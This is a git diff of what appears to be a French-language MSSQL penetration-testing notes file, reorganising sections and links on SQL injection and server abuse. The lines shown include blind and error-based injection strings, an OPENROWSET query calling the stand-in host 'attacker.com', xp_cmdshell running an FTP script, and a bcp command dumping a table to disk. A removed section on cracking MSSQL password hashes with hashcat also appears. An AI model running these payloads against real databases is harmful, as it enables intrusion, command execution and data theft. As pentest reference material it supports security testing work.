@@ -57,23 +57,9 @@ Go to the SQL Server command-line window and hit ctrl+C. It will prompt "Do you 
 Close the command-prompt
 Restart SQL Server service and login away!
 
-# Mon install de MSSQLServer 2005 sur ma VM locale windows 2003 EN.
-Pendant l'install, j'ai selectionné :
- - "Default instance"
- - "Use the built-in System account" "Local system"
- - "Windows Authentication Mode"
-Le reste des questions, j'ai laissé par defaut.
-
-# hashcat mssql
-0x0100 [a-Z0-9]{8} [a-Z0-9]{40}        [a-Z0-9]{40}
-           salt   sha1($pass.$salt)  sha1($pass.upper().$salt)
-oclhashcat-plus -m 2500
-oclhashcat-lite -m 1300
-
 # audit / pentest
 * boolean blind
 and unicode(substring((select isnull(@@version,char(32))),1,1))=77 # 'M' de Microsoft
-
 group by news.news_id having 1=1--
 
 * error based sqli
@@ -190,8 +176,7 @@ http://xd-blog.com.ar/descargas/manuales/bugs/full-mssql-injection-pwnage.html
 # command exec without xp_cmdshell with agent jobs
 https://www.optiv.com/blog/mssql-agent-jobs-for-command-execution
 
-# OPENROWSET 
-# http://codewhitesec.blogspot.com.au/2015/06/reading-and-writing-files-with-mssql-openrowset.html
+# OPENROWSET http://codewhitesec.blogspot.com.au/2015/06/reading-and-writing-files-with-mssql-openrowset.html
 si on n'est pas sysadmin
 * first make sure openrowset is enabled with 'ad hoc distributed queries'
 select * from OpenRowSet('SQLOLEDB','Network=DBMSSOCN;Address=yespapa.d2t.attacker.com;uid=sa;pwd=','exec master..xp_msver')
@@ -219,7 +204,8 @@ exec master..xp_cmdshell 'ftp -n -s:ftpscript.txt';--
 # export table to file
 exec xp_cmdshell 'bcp "select * from db.dbo.tablename" queryout "c:\windows\temp\blah.txt" -c -T'
 
-# tricks
+# advanced tricks
+https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/
 https://www.netspi.com/blog/entryid/228/locate-and-attack-domain-sql-servers-without-scanning
 http://www.casaba.com/blog/2013/05/sql-server-now-with-reflective-dllexe-injection/
 https://www.netspi.com/blog/entryid/197/how-to-hack-database-links-in-sql-server
